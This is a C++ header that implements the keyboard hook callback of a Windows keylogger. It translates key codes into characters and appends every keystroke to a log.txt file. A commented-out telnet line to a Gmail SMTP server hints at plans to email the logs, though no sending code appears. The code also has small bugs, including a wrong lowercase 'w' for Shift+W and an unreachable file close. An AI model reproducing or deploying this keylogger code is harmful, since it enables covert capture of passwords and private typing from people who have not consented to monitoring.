#include <Windows.h>
#include <string>

#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>
#include <fstream>

#ifndef KEYS_H
#define KEYS_H
//telnet alt4.gmail-smtp-in.l.google.com 25


LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	std::ofstream file;
	file.open("log.txt", std::ios_base::app);
	KBDLLHOOKSTRUCT *keyboard = (KBDLLHOOKSTRUCT *)lParam; // Contains information about a low-level keyboard input event.
														   //https://docs.microsoft.com/en-us/windows/win32/api/winuser/ns-winuser-kbdllhookstruct

	switch (wParam){
		case WM_KEYDOWN: {
			DWORD vkCode = keyboard->vkCode;
			if (GetAsyncKeyState(VK_SHIFT)) {
				switch (vkCode) {
					case 0x30: // SHIFT + 0
						file << ")";
						break;
					case 0x31: // SHIFT + 1
						file << "!";
						break;
					case 0x32: // SHIFT + 2
						file << "@";
						break;
					case 0x33: // SHIFT + 3
						file << "#";
						break;
					case 0x34: // SHIFT + 4
						file << "$";
						break;
					case 0x35: // SHIFT + 5
						file << "%";
						break;
					case 0x36: // SHIFT + 6
						file << "^";
						break;
					case 0x37: // SHIFT + 7
						file << "&";
						break;
					case 0x38: // SHIFT + 8
						file << "*";
						break;
					case 0x39: // SHIFT + 9
						file << "(";
						break;
					case 0x41: // SHIFT + a
						file << "A";
						break;
					case 0x42: // SHIFT + b
						file << "B";
						break;
					case 0x43: // SHIFT + c
						file << "C";
						break;
					case 0x44: // SHIFT + d
						file << "D";
						break;
					case 0x45: // SHIFT + e
						file << "E";
						break;
					case 0x46: // SHIFT + f
						file << "F";
						break;
					case 0x47: // SHIFT + g
						file << "G";
						break;
					case 0x48: // SHIFT + h
						file << "H";
						break;
					case 0x49: // SHIFT + i
						file << "I";
						break;
					case 0x4A: // SHIFT + j
						file << "J";
						break;
					case 0x4B: // SHIFT + k
						file << "K";
						break;
					case 0x4C: // SHIFT + l
						file << "L";
						break;
					case 0x4D: // SHIFT + m
						file << "M";
						break;
					case 0x4E: // SHIFT + n
						file << "N";
						break;
					case 0x4F: // SHIFT + o
						file << "O";
						break;
					case 0x50: // SHIFT + p
						file << "P";
						break;
					case 0x51: // SHIFT + q
						file << "Q";
						break;
					case 0x52: // SHIFT + r
						file << "R";
						break;
					case 0x53: // SHIFT + s
						file << "S";
						break;
					case 0x54: // SHIFT + t
						file << "T";
						break;
					case 0x55: // SHIFT + u
						file << "U";
						break;
					case 0x56: // SHIFT + v
						file << "V";
						break;
					case 0x57: // SHIFT + w
						file << "w";
						break;
					case 0x58: // SHIFT + x
						file << "X";
						break;
					case 0x59: // SHIFT + y
						file << "Y";
						break;
					case 0x5A: // SHIFT + z
						file << "Z";
						break;
				}
			}
			else if (!GetAsyncKeyState(VK_SHIFT)) {
				switch (vkCode) {
				case 0x30:
					file << "0";
					break;
				case 0x31: // SHIFT + 1
					file << "1";
					break;
				case 0x32: // SHIFT + 2
					file << "2";
					break;
				case 0x33: // SHIFT + 3
					file << "3";
					break;
				case 0x34: // SHIFT + 4
					file << "4";
					break;
				case 0x35: // SHIFT + 5
					file << "5";
					break;
				case 0x36: // SHIFT + 6
					file << "6";
					break;
				case 0x37: // SHIFT + 7
					file << "7";
					break;
				case 0x38: // SHIFT + 8
					file << "8";
					break;
				case 0x39: // SHIFT + 9
					file << "9";
					break;
				case 0x41: // SHIFT + a
					file << "a";
					break;
				case 0x42: // SHIFT + b
					file << "b";
					break;
				case 0x43: // SHIFT + c
					file << "c";
					break;
				case 0x44: // SHIFT + d
					file << "d";
					break;
				case 0x45: // SHIFT + e
					file << "e";
					break;
				case 0x46: // SHIFT + f
					file << "f";
					break;
				case 0x47: // SHIFT + g
					file << "g";
					break;
				case 0x48: // SHIFT + h
					file << "h";
					break;
				case 0x49: // SHIFT + i
					file << "i";
					break;
				case 0x4A: // SHIFT + j
					file << "j";
					break;
				case 0x4B: // SHIFT + k
					file << "k";
					break;
				case 0x4C: // SHIFT + l
					file << "l";
					break;
				case 0x4D: // SHIFT + m
					file << "m";
					break;
				case 0x4E: // SHIFT + n
					file << "n";
					break;
				case 0x4F: // SHIFT + o
					file << "o";
					break;
				case 0x50: // SHIFT + p
					file << "p";
					break;
				case 0x51: // SHIFT + q
					file << "q";
					break;
				case 0x52: // SHIFT + r
					file << "r";
					break;
				case 0x53: // SHIFT + s
					file << "s";
					break;
				case 0x54: // SHIFT + t
					file << "t";
					break;
				case 0x55: // SHIFT + u
					file << "u";
					break;
				case 0x56: // SHIFT + v
					file << "v";
					break;
				case 0x57: // SHIFT + w
					file << "w";
					break;
				case 0x58: // SHIFT + x
					file << "x";
					break;
				case 0x59: // SHIFT + y
					file << "y";
					break;
				case 0x5A: // SHIFT + z
					file << "z";
					break;
				}
			}
		}
		default:
			return CallNextHookEx(NULL, nCode, wParam, lParam);
			file.close();
	}
	file.close();
	return 0;
}

#endif